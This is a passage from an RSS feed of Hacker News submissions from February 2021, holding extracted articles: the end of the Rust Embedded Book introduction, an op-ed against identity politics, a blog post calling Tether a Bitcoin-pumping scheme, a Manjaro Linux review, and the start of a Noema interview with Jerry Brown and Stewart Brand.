<tr><td>Rust, Embedded</td><td><a href="https://docs.rust-embedded.org/faq.html">embedded FAQ</a></td><td>Frequently asked questions about Rust in an embedded context.</td></tr>
<tr><td>Interrupts</td><td><a href="https://en.wikipedia.org/wiki/Interrupt">Interrupt</a></td><td>-</td></tr>
<tr><td>Memory-mapped IO/Peripherals</td><td><a href="https://en.wikipedia.org/wiki/Memory-mapped_I/O">Memory-mapped I/O</a></td><td>-</td></tr>
<tr><td>SPI, UART, RS232, USB, I2C, TTL</td><td><a href="https://electronics.stackexchange.com/questions/37814/usart-uart-rs232-usb-spi-i2c-ttl-etc-what-are-all-of-these-and-how-do-th">Stack Exchange about SPI, UART, and other interfaces</a></td><td>-</td></tr>
</tbody></table>
<h2><a href="#how-to-use-this-book" id="how-to-use-this-book">How to Use This Book</a></h2>
<p>This book generally assumes that you‚Äôre reading it front-to-back. Later
chapters build on concepts in earlier chapters, and earlier chapters may
not dig into details on a topic, revisiting the topic in a later chapter.</p>
<p>This book will be using the <a href="http://www.st.com/en/evaluation-tools/stm32f3discovery.html">STM32F3DISCOVERY</a> development board from
STMicroelectronics for the majority of the examples contained within. This board
is based on the ARM Cortex-M architecture, and while basic functionality is
the same across most CPUs based on this architecture, peripherals and other
implementation details of Microcontrollers are different between different
vendors, and often even different between Microcontroller families from the same
vendor.</p>
<p>For this reason, we suggest purchasing the <a href="http://www.st.com/en/evaluation-tools/stm32f3discovery.html">STM32F3DISCOVERY</a> development board
for the purpose of following the examples in this book.</p>
<h2><a href="#contributing-to-this-book" id="contributing-to-this-book">Contributing to This Book</a></h2>
<p>The work on this book is coordinated in <a href="https://github.com/rust-embedded/book">this repository</a> and is mainly
developed by the <a href="https://github.com/rust-embedded/wg#the-resources-team">resources team</a>.</p>
<p>If you have trouble following the instructions in this book or find that some
section of the book is not clear enough or hard to follow then that's a bug and
it should be reported in <a href="https://github.com/rust-embedded/book/issues/">the issue tracker</a> of this book.</p>
<p>Pull requests fixing typos and adding new content are very welcome!</p>
<h2><a href="#re-using-this-material" id="re-using-this-material">Re-using this material</a></h2>
<p>This book is distributed under the following licenses:</p>
<ul>
<li>The code samples and free-standing Cargo projects contained within this book are licensed under the terms of both the <a href="https://opensource.org/licenses/MIT">MIT License</a> and the <a href="http://www.apache.org/licenses/LICENSE-2.0">Apache License v2.0</a>.</li>
<li>The written prose, pictures and diagrams contained within this book are licensed under the terms of the Creative Commons <a href="https://creativecommons.org/licenses/by-sa/4.0/legalcode">CC-BY-SA v4.0</a> license.</li>
</ul>
<p>TL;DR: If you want to use our text or images in your work, you need to:</p>
<ul>
<li>Give the appropriate credit (i.e. mention this book on your slide, and provide a link to the relevant page)</li>
<li>Provide a link to the <a href="https://creativecommons.org/licenses/by-sa/4.0/legalcode">CC-BY-SA v4.0</a> licence</li>
<li>Indicate if you have changed the material in any way, and make any changes to our material available under the same licence</li>
</ul>
<p>Also, please do let us know if you find this book useful!</p>

                    </main>

                    <nav aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        

                        
                            <a rel="next" href="https://rust-embedded.github.io/book/intro/hardware.html" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i></i>
                            </a>
                        

                        
                    </nav>
                </div>
            </div>

            <nav aria-label="Page navigation">
                

                
                    <a rel="next" href="https://rust-embedded.github.io/book/intro/hardware.html" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i></i>
                    </a>
                
            </nav>

        </div>

        

        

        

        
        
        

        

        
        
        
        
        

        
        
        

        <!-- Custom JS scripts -->
        

        

    

</div>]]>
            </description>
            <link>https://rust-embedded.github.io/book/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124375</guid>
            <pubDate>Sat, 13 Feb 2021 16:07:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Identity and Identity Politics]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26124098">thread link</a>) | @dsrnewell
<br/>
February 13, 2021 | https://realclearconservatism.com/2021/02/13/identity-and-identity-politics/ | <a href="https://web.archive.org/web/*/https://realclearconservatism.com/2021/02/13/identity-and-identity-politics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Identity politics has become one of the, if not <em>the</em>, predominant markers of American politics during the past ten years. Previously relegated to the extremes of the political spectrum, it has now come to encompass mainstream political discourse and has come to define, not only the political playing field, but also social and economic life.&nbsp;</p>



<p>When Google encourages people to make online purchases based on the pigmentation of online business owners‚Äô skin, you can be sure that identity politics has reached a tipping point.&nbsp;</p>



<p>However honorable you may think the goals of certain strains of identity politics may be (whether left, right, or middle), or however important you think certain tactical victories made possible by identity politics are, in the long run, as they say, it all ends in tears.</p>



<p>While identity politics was once primarily the purview of the American left, it has now infected the right as well. While once the banner of racial solidarity and sexual identity was raised in the name of progressivism, it now flies over the ranks of the reactionary, traditionalist right. As should have been expected. Both are equally cancerous for American government and society.</p>



<p>And now we have a culture war where the battlelines (racial, sexual, cultural, and national) are drawn in such a way that it is impossible to defect to one or the other side without being burned at society‚Äôs stake, no matter how good your intentions.&nbsp;</p>



<p>Of course, neoliberalism itself bears much of the blame. In a (deeply misguided) effort to enact equality, neoliberalism claims that people are, or should be, entirely free of any socially distinguishing characteristics and context. Neoliberalism claims that background, history, family, faith, and culture should have no extant claim on the individual. In this way, neoliberalism suppresses human individuality. And, as is the case when something is suppressed, reactions to the suppression are often overdone and unhealthy.&nbsp;</p>



<p>But identity itself is not the problem. Far from it. Identity is essential to humanity. Rather, it is identity <em>politics</em> that is the root of this current evil.&nbsp;</p>



<p>Politics is the process of collective action. In order to act collectively, people need to feel common cause with others. That is, they need to form groups based on some shared desire or belief. This is normally a normal and healthy, if somewhat contentious, process.&nbsp;</p>



<p>However, when the common cause around which people congregate is identity, you have a problem. This is because, even on the extreme left‚Äîbeing possessed, as it is, by doctrinaire relativism‚Äîidentity is nonetheless viewed as more or less ‚Äúessential,‚Äù or even immutable.&nbsp;</p>



<p>While it may seem a contradiction, the identitarian left views identity as biological and essential in cases of race and culture (i.e., your skin color and history) on the one hand, while simultaneously viewing identity as a matter of personal preference in the case of sexuality (i.e., your gender and who you are attracted to). Either way, identity is viewed as essential or immutable and unchangeable by society. Hence the negative reactions on the left to racial/cultural appropriation and conversion therapy.</p>



<p>Identity is also problematic as a common cause for collective action on the identitarian right. Here, identity is viewed as equally essential and immutable. In the case of the right, the basis for identity is nativism and culture (i.e., your country of birth and your history). Hence the negative reactions on the right to immigration and non-Christian religion.&nbsp;</p>



<p>In either case, the cause for collective action in identity politics is not purely shared sentiment, but essential and immutable identity. In other words, the side you belong to is predetermined. Deserters can and will be shot (c.f. RINOs and Uncle Toms). This is, of course, a formula for political (and social) disaster. In Rwanda, Srebrenica, and Nazi-controlled Europe, as well as throughout history, it led to genocide.&nbsp;</p>



<p>It should be noted, though, that the problem with identity politics is not <em>identity</em> as such, but rather the need to create identities that are large enough to enable collective action. By creating large identity groups through evoking large-scale identifiers such as race, religion, culture, etc., you not only create ‚Äúus‚Äù and ‚Äúthem,‚Äù but you necessarily emphasize one or two aspects of peoples‚Äô identities, while downplaying others, all in the name of unity.</p>



<p>In other words, the process of identity politics renders individual identity invisible, to use the leftist terminology. Which is ironic considering the emphasis the left places on how racial, cultural, and sexual identity are rendered invisible by the ‚Äúwhite, male patriarchy.‚Äù&nbsp;</p>



<p>But whether identity politics divides people based on race, sexual identity, intersectionality, nationality, or religion, the result is the same; <em>true </em>diversity and <em>true</em> individuality are suppressed, erased, and made invisible. All in the name of ‚Äúthe cause.‚Äù</p>



<p>Which is sad, because individuals are <em>so</em> much more than a caricatured composite of how they look, who they are attracted to, and where they were born. In other words, the <em>identity</em> of identity politics doesn‚Äôt go <em>nearly far enough</em>.&nbsp;</p>



<p><em>Of course</em>, race, sexuality, and the country, culture, and religion in which we are born, make up part of who we are. But so do our other genes and phenotypes, our individual personalities, our highly idiosyncratic and eclectic values, beliefs, preferences, attitudes, behaviors, quirks, and, of course, the <em>choices</em> we make independent of all of these.&nbsp;</p>



<p>Liberalism‚Äîat least as it was classically understood (c.f. Kant, Locke, etc.)‚Äîwas revolutionary because it placed a unique and immutable value on <em>the individual</em>. Not the individual‚Äôs race, sexuality, religion, or place of birth, but <em>the individual as such</em>, recognizing each as unique and uniquely valuable. Full stop. Identity politics suppresses this fact in the pursuit of political power.&nbsp;</p>



<p>As the napalm of political tools, the use of identity politics, whatever its intended ends, should be categorically rejected by all ends of the political spectrum.</p>
	</div></div>]]>
            </description>
            <link>https://realclearconservatism.com/2021/02/13/identity-and-identity-politics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124098</guid>
            <pubDate>Sat, 13 Feb 2021 15:26:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[USDT (Tether) Is Just a Fancy Venezuelan Peso]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26124089">thread link</a>) | @dgellow
<br/>
February 13, 2021 | http://www.tr0lly.com/bitcoin/usdt-is-a-fancy-venezuelan-peso/ | <a href="https://web.archive.org/web/*/http://www.tr0lly.com/bitcoin/usdt-is-a-fancy-venezuelan-peso/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-1120">
	
	<div>
		
<p>We already had one instance of Bitcoin being artificially manipulated upwards, in 2013, and most people who bought in got screwed. At the time, the fraud was happening on MtGox, an exchange that was processing over half of all trading volume, and was in a position to manipulate the market.</p>



<p>Today, over 70% of Bitcoin trading is happening against USDT, a stablecoin that‚Äôs being printed out of thin air at an exponential rate. People who are still buying Bitcoin with real dollars, now that everyone has understood the scheme, are simply the greatest fools who allow the scammers to cash out, right before the collapse.</p>



<h3>The best performing asset in the world</h3>



<p>If you think Bitcoin is the best performing asset right now, think again. You‚Äôre going to kick yourself for missing this one:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-18.31.45.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-18.31.45.png 999w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-18.31.45-300x159.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-18.31.45-768x407.png 768w" sizes="(max-width: 999px) 100vw, 999px"></figure>



<p>Yes, it‚Äôs a one year chart, and the asset in question is really up 2,300,000% over the last year. That‚Äôs two million three hundred thousand percent ARR. And it‚Äôs not some unknown painting that turned out to be a Da Vinci, that only an insider could buy before it mooned. No, it‚Äôs a stock index, everything is legit, the chart is from Bloomberg. And I can guarantee you that if you buy in today, you‚Äôre still early. It will continue to moon next year as well.</p>



<p>The chart above is that of the <a href="https://www.bloomberg.com/quote/IBVC:IND">Caracas Stock Exchange Stock Market Index</a>. You might have noticed that it‚Äôs denominated in VES, or Venezuelan Peso, a currency that‚Äôs going to lose half its value before the end of the day, as a result of relentless money printing by the Venezuelan central bank.</p>



<p>You can check the stock prices of any country with high inflation ‚Äì from Zimbabwe to Argentina ‚Äì and you‚Äôll notice the same pattern, over and over again. ‚ÄúMoney printer goes brrr‚Äù makes asset prices denominated in that currency go to the moon, and it‚Äôs never too late to join the party.</p>



<p>Obviously investing in Venezuelan or Zimbabwean equities won‚Äôt make you a billionaire in a few month‚Äôs time. The falling value of the currency will offset the gains, and you‚Äôll end up holding some rather illiquid stocks that will be worth‚Ä¶ probably something, but not billions of US dollars.</p>



<p>In the past, Venezuelan government officials tried to hide this reality by setting an ‚Äúofficial‚Äù rate for the peso against the US dollar. Of course, you couldn‚Äôt buy any dollars with your pesos at that rate, but for someone who wasn‚Äôt paying attention, it might have looked like things weren‚Äôt that bad. </p>



<p>You could, of course, buy pesos with your dollars at that rate, but nobody was that stupid. Venezuelans knew the truth, because they were witnessing that the value of the peso was plummeting: a bag of carrots at the market would cost a thousand of pesos one day, and two thousands the day after, and so forth.</p>



<h3>A Potemkin village of a market</h3>



<p>But what if you couldn‚Äôt buy anything with your pesos, but the stock market? What if the Venezuelan government had such a tight grip on appearances, and on places that traded the peso, that you wouldn‚Äôt know the truth, at least for a while? You‚Äôd only see a chart that‚Äôs mooning, and only hear about people buying in because it was mooning, and those people would seem to be making stupid amounts of money day after day.</p>



<p>If you think this is impossible, google ‚Äú<a href="https://www.investopedia.com/news/bots-drove-bitcoins-150to1000-rise-2013-paper/">Willy Bot</a>‚Äú. At the time, the online exchange MtGox was an absolute leader in Bitcoin trading, with over half of all worldwide trading volume. You would wire your dollars to MtGox, receive MtGox credits in your account, that everyone believed to be worth their face value in USD, and buy Bitcoin with them. Bitcoin went up as if on steroids, and nobody questioned the goose that laid golden eggs.</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/coindesk-bpi-chart-86-728x404.jpg" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/coindesk-bpi-chart-86-728x404.jpg 728w, http://www.tr0lly.com/wp-content/uploads/2021/02/coindesk-bpi-chart-86-728x404-300x166.jpg 300w" sizes="(max-width: 728px) 100vw, 728px"></figure>



<p>Until too many people tried to cash out, and MtGox went bust. You might notice that the price of Bitcoin didn‚Äôt crash that much afterwards, for the very simple reason that the exchange froze everyone‚Äôs accounts. Nobody was allowed to access their Bitcoins once the truth was out. Bitcoin not crashing to zero is little solace when you lost yours.</p>



<p>This was the exact same scenario as described with the imaginary all-powerful Venezuelan government ‚Äì a central party (MtGox a.k.a. the Venezuelan government) that‚Äôs able to distort the perception of reality and print its way to the moon, attracting hordes of wannabe millionaires. Until one investor too many try to cash out and everything collapses.</p>



<h3>Fool me once‚Ä¶</h3>



<p>Surely that couldn‚Äôt happen again, people aren‚Äôt THAT stupid, right?</p>



<p>Well, it‚Äôs happening again. Over <a href="https://blog.kaiko.com/tether-vs-usd-is-a-dollar-a-dollar-when-it-comes-to-trading-4632380f4284">70% of Bitcoin is traded against USDT</a>, a stablecoin that‚Äôs being printed at an exponentially growing rate:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-19.22.40.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-19.22.40.png 987w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-19.22.40-300x168.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-19.22.40-768x430.png 768w" sizes="(max-width: 987px) 100vw, 987px"><figcaption>source: Tradingview</figcaption></figure>



<p>There are no basis for believing that USDT tokens are worth anything. USDTs are issued by Tether, a shady company whose legally declared office doesn‚Äôt exist, and that‚Äôs being investigated by the NYAG for fraud. Legally, USDTs are worthless: only a few selected secret parties can ask to redeem them for US dollars, and even then, Tether has the right to delay the redemption requests for as long as they want:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-19.27.05.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-19.27.05.png 740w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-19.27.05-300x118.png 300w" sizes="(max-width: 740px) 100vw, 740px"><figcaption>source: tether.to/legal</figcaption></figure>



<p>You cannot buy anything with USDTs but cryptocurrencies ‚Äì mainly Bitcoin. There is no reason to believe that USDTs aren‚Äôt printed out of thin air: Tether has systematically failed to provide an audit of its reserves, and they won‚Äôt even say what those reserves are. <a href="http://www.tr0lly.com/bitcoin/the-great-tether-bitcoin-collateral-flippening/">Cryptocurrency macro flows show that USDTs are most probably backed by Bitcoins themselves</a>, meaning that USDTs are issued to buy Bitcoin, thus pumping Bitcoin‚Äôs price.</p>



<p>The problem with USDTs being backed by Bitcoins is that Bitcoin can‚Äôt fall, or USDTs will no longer be properly backed, and exchanges will panic. This forces Tether to keep printing ever more USDTs to pump Bitcoin‚Äôs price, in an exponential race to the death until exchanges can no longer maintain the USDT peg because people who made millions of paper gains try to cash out ‚Äì albeit a little bit, and everyone realises USDTs were just a fancy version of the Venezuelan peso.</p>



<p>However, as long as the day is young and there are more real USD buyers than USD sellers, the scammers can cash out for real dollars. The mechanics of the scheme are simple:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-20.47.32.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-20.47.32.png 657w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-20.47.32-300x206.png 300w" sizes="(max-width: 657px) 100vw, 657px"></figure>



<h3>The rising price fallacy</h3>



<p>With Bitcoin going up by 20% every month, a lot of people might be tempted to think, ‚Äúhey, even if it‚Äôs a Ponzi scheme, it only needs to go on for a few more months and I‚Äôll double my money, and then I‚Äôll cash out before it collapses‚Äù.</p>



<p>But that‚Äôs the thing with fake markets ‚Äì most people lose all their money, because most people don‚Äôt manage to cash out before the scheme collapses. The moment the inflows of USDs start to dwindle, the scammers close shop and disappear. Remember ‚Äì these scammers have painstakingly put the scheme together with only one goal: get as much real dollars as possible, by selling you Bitcoins they‚Äôve purchased with worthless tokens. They will not give a penny of their loot back, the moment they think their scheme is unraveling.</p>



<p>If you aren‚Äôt an insider, you have no way of knowing when that will happen, so your decision of buying in or cashing out is taken randomly. If you don‚Äôt have any insider information, you become part of the statistic. And statistics say that 99% of people will lose everything, and that you will almost certainly be in that 99%.</p>



<p>The rising price fallacy is the misconception that the longer a scheme goes up in price, the lower are the chances of it crashing in the near future. The reality is the exact opposite: the scheme has to suck in a lot of fools to establish that upward price chart, and by the time you, a random person with no inside information, has noticed it, most people are already invested, and you‚Äôll just be part of the final herd.</p>



<p>Of course everybody thinks that they‚Äôre special, that they‚Äôre not part of the herd, that they‚Äôre smarter than the rest. That‚Äôs why the scam works. Because people need to rationalise the fact that they‚Äôre smarter than the rest, the founding pillar of Bitcoin communication is, ‚Äúyou‚Äôre still early‚Äù, and ‚Äúmore people are coming‚Äù. Much has been said about Tesla buying $1.5 billion worth of Bitcoin. But nobody is talking about the fact that someone has SOLD Tesla $1.5 billion worth of Bitcoin. Why has someone sold $1.5 billion worth of Bitcoin? Weren‚Äôt THEY aware of the fact that Bitcoin can only go up?</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Emperors-New-Clothes.jpg" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Emperors-New-Clothes.jpg 540w, http://www.tr0lly.com/wp-content/uploads/2021/02/Emperors-New-Clothes-300x201.jpg 300w" sizes="(max-width: 540px) 100vw, 540px"></figure>



<p>Nobody is talking about the crash to come, precisely because everyone invested knows that it‚Äôs a manipulated market, and they are hoping to cash out before the others. So the last thing everyone wants to do, is say anything that might make the other investors doubt, which could make those investors think about cashing out before they do. The tale of Emperor‚Äôs New Clothes is as old as civilization itself.</p>



<p>The endgame is simple: for everyone who is buying in, people are cashing out. Those who are cashing out, are part of the 1% who won‚Äôt lose it all. Statistically, you aren‚Äôt part of them.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

			
</article><!-- #post-${ID} -->

	<nav role="navigation">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>http://www.tr0lly.com/bitcoin/usdt-is-a-fancy-venezuelan-peso/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124089</guid>
            <pubDate>Sat, 13 Feb 2021 15:25:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[17 Years of Wordpress]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26123890">thread link</a>) | @pro_methe5
<br/>
February 13, 2021 | https://www.visualsource.net/repo/github.com/wordpress/wordpress | <a href="https://web.archive.org/web/*/https://www.visualsource.net/repo/github.com/wordpress/wordpress">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.visualsource.net/repo/github.com/wordpress/wordpress</link>
            <guid isPermaLink="false">hacker-news-small-sites-26123890</guid>
            <pubDate>Sat, 13 Feb 2021 14:54:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tutorial: Metacompilers Part 1]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26123775">thread link</a>) | @gjvc
<br/>
February 13, 2021 | http://www.bayfronttechnologies.com/mc_tutorial.html | <a href="https://web.archive.org/web/*/http://www.bayfronttechnologies.com/mc_tutorial.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.bayfronttechnologies.com/mc_tutorial.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26123775</guid>
            <pubDate>Sat, 13 Feb 2021 14:31:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The state of Linux on desktop in 2020]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26123746">thread link</a>) | @tuananh
<br/>
February 13, 2021 | https://tuananh.net/2021/02/13/the-state-of-linux-on-desktop/ | <a href="https://web.archive.org/web/*/https://tuananh.net/2021/02/13/the-state-of-linux-on-desktop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I got fed up with macOS. While the new hardware(Apple Silicon) got amazing feedbacks, the OS itself
is so lag behind.</p>

<p>I got a Windows 10 desktop at home and heck, it was event much more pleasant to use than using macOS.</p>

<ul>
  <li>As a typical user (web browsing, mail and office stuff), Windows 10 is very good.</li>
  <li>As a developer, it‚Äôs getting a lot better with WSL/Microsoft Terminal/etc‚Ä¶</li>
</ul>

<p>I decided to give Linux another evaluation test. I pick Manjaro - an Arch-based over an Ubuntu-based 
distro this time after hearing all kind of praise from its users. But I also don‚Äôt want to configure
everything I need to use, hence Manjaro.</p>

<blockquote>
  <p>Manjaro is a user-friendly Linux distribution based on the independently developed Arch operating 
system. Within the Linux community, Arch itself is renowned for being an exceptionally fast, 
powerful, and lightweight distribution that provides access to the very latest cutting edge - and 
bleeding edge - software. However, Arch is also aimed at more experienced or technically-minded 
users. As such, it is generally considered to be beyond the reach of those who lack the technical 
expertise (or persistence) required to use it.</p>

  <p>via <a href="https://wiki.manjaro.org/index.php/About_Manjaro">wiki.manjaro.org</a></p>
</blockquote>

<p>So looks like it got the best of both worlds right?</p>

<h2 id="the-test-setup">The test setup</h2>

<p>I built a new mini PC recently. It‚Äôs the Asrock Deskmini X300W that use AMD processor. If you prefer
Intel, you can choose the Intel version of the box.</p>

<p>I went with AMD because I like their Zen offering and I would love to support them.</p>

<p>I just throw a 6 cores AMD 4650G processor, 32GB of 3200Mhz Crucial memory, 512GB Samsung NVME drive for 
OS and other stuff plus another 1TB 2.5‚Äô SSD for storage.</p>

<p>For OS, I went with Manjaro KDE variant because I like the look of it.</p>

<h2 id="the-experience">The experience</h2>

<p>Almost everything works out of the box.</p>

<ul>
  <li>
    <p>The graphic works right. I do not have an Intel GPU so it‚Äôs much easier for me but I hear 
terrifying stories from other side of the world.</p>
  </li>
  <li>
    <p>WiFi works. Zero complaints here.</p>
  </li>
  <li>
    <p>The bluetooth is almost ok. Most stuff I throw at it works, except an old Xbox One controller of
mine. The one came with Xbox One S works with 1 minor additional step (disable ERTM). I tested with
4 bluetooth mouses, 2 keyboards, 1 speaker and 2 Xbox controllers.</p>
  </li>
  <li>
    <p>Since I pick KDE, it‚Äôs a bit troublesome to use setup i3 wm. After reading several tutorials, I 
decided not to bother with one. Instead, I settled with 
<a href="https://github.com/esjeon/krohnkite">krohnkite</a> plugin for KWin. It works really well for my needs
, given that my needs are pretty basic.</p>
  </li>
  <li>
    <p>I do gaming once in awhile and Manjaro even came bundled with Steam (LOL). One might say it‚Äôs so
bloat but I‚Äôm ok. Storage is cheap these days.</p>
  </li>
  <li>
    <p>Developer experience is awesome. Linux is usually first-class platform for open source projects.
Everything just works. Docker is so fast because no VM required. It‚Äôs the best platform for 
developers, hands down.</p>
  </li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>So far, I‚Äôm loving it. It does everything I need and works with all the peripherals I have, 
with the exception of the Xbox One controller (wired connection still work though). I‚Äôm gonna stick with
Manjaro for now. I don‚Äôt see myself moving to Arch since my love for tweaking the system is long
gone. I just want something that works and Manjaro does work very well for me.</p>

  </div></div>]]>
            </description>
            <link>https://tuananh.net/2021/02/13/the-state-of-linux-on-desktop/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26123746</guid>
            <pubDate>Sat, 13 Feb 2021 14:24:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Origins of ‚ÄòPlanetary Realism‚Äô and ‚ÄòWhole Earth Thinking‚Äô]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26123744">thread link</a>) | @nabla9
<br/>
February 13, 2021 | https://www.noemamag.com/the-origins-of-planetary-realism-and-whole-earth-thinking/ | <a href="https://web.archive.org/web/*/https://www.noemamag.com/the-origins-of-planetary-realism-and-whole-earth-thinking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

				<div>
  <p>Credits</p>
  <div>
    
<p>Jerry Brown was the governor of California from 1975 to 1983 and again from 2011 to 2019. He was also the mayor of Oakland from 1999 to 2007 and California‚Äôs attorney-general from 2007 to 2011. He recently cofounded the California-China Climate Institute at the University of California, Berkeley.</p>

<p>Stewart Brand is a writer and was the editor of the Whole Earth Catalog and of CoEvolution Quarterly. He cofounded the Long Now Foundation in 1996.</p>

  </div>
</div>


<p><em>This conversation was facilitated by Noema deputy editor Nils Gilman.</em></p>



<p><strong>Gilman: </strong>Governor Brown, how did you first formulate the idea of planetary realism?</p>



<p><strong>Brown: </strong>It happened in a mundane way. I was running for president in 1976, and I was formulating some ideas on foreign policy. As I discussed these issues with knowledgeable people, I thought of the world as being deeply interconnected. I had the sense that it wasn‚Äôt just ‚Äúus against them,‚Äù but rather that there was connectivity among all nations across a range of issues.</p>



<p>On the one hand, I wanted to be realistic: hard-boiled, not getting carried away with utopianism. That‚Äôs the realistic side: Morgenthau, Machiavelli, Kissinger. But on the other hand, I wanted to add a dose of humanism and romanticism as well. I wanted to combine realism with some more thoughtful ideals, reflecting something more caring. So, I took the word ‚Äúrealism‚Äù and put it together with ‚Äúplanetary,‚Äù because this was the early part of the environmental movement ‚Äî the <span data-note="The Stockholm Conference was among the United Nations‚Äô first major international environmental symposiums.">Stockholm Conference</span> had just happened in 1972.</p>



<p>Back then, I wasn‚Äôt thinking about climate change, but rather of the sea and of nuclear war. I argued that we had to see the big picture ‚Äî you might call it the ‚Äúwhole Earth perspective,‚Äù as opposed to nationalism and the politics of scapegoating. We can‚Äôt let nationalism run away with us ‚Äî we have to think of the interests we share. Today, that includes the shared vulnerability to viruses, cyber-attacks and climate change.</p>



<p><strong>Gilman: </strong>With that frame in mind, how has your thinking about planetary realism changed over the last four decades?</p>



<p><strong>Brown: </strong>My concern about blindness and beliefs has intensified. I‚Äôm taken with how strong beliefs are, and I don‚Äôt say that in a positive way: Recent politics has become the collision of beliefs.</p>



<p>I‚Äôve become impressed with the lack of this thing called ‚Äúreason.‚Äù I used to think that, overall, we‚Äôre reasonable people. But now I think we‚Äôre all belief people. We‚Äôre not fact-based ‚Äî we‚Äôre belief-based. I think of the end of the poem ‚ÄúDover Beach‚Äù by Matthew Arnold:</p>



<div><p>And we are here as on a darkling plain<br>Swept with confused alarms of struggle and flight,<br>Where ignorant armies clash by night.</p></div>



<p>I look out today and see a lot of what I would call ignorant armies clashing by night. The result is that I have become more minimalist in my assertions. As a governor, I had to decide things all the time, and I didn‚Äôt always have time to probe too deeply. Therefore, I decided to go after things where I thought it was pretty clear what we needed to do, like climate change and prison reform.</p>



<p>On most things, we either aren‚Äôt clear or we don‚Äôt have the time or inclination to get to the bottom of them. I would say that today I know more, including that the universe is much bigger than I realized. So, I‚Äôd say a bit of humility has entered the picture.</p>



<p><strong>Gilman: </strong>Stewart, does your trajectory around ‚Äúwhole Earth thinking‚Äù mirror the governor‚Äôs on planetary realism? Where did the idea of the ‚Äúwhole Earth‚Äù come from to begin with?</p>



<p><strong>Brand: </strong>For me, it began in 1966, right after the <span data-note="The Trips Festival was a weekend-long, LSD-infused, immersive arts and music experience in San Francisco in January 1966 that is now recognized as a landmark moment in the early hippie counterculture movement of the 1960s and 1970s.">Trips Festival,</span> which I had helped to organize. On the roof of my apartment in San Francisco, I had an LSD-laced vision where I asked myself, ‚ÄúWhat am I going to do for humanity?‚Äù And looking up, I thought: If we saw a plausible photograph of Earth from outer space, ideally in color and ideally of the whole globe, not just one section of it, that could make a difference. I started promoting that, handing out buttons that asked, ‚ÄúWhy haven‚Äôt we seen a photograph of the whole Earth yet?‚Äù When that photo was finally published, it provided the cover for the Whole Earth Catalog. For me, the whole Earth has been a frame that directed attention toward things we might otherwise not take seriously.</p>



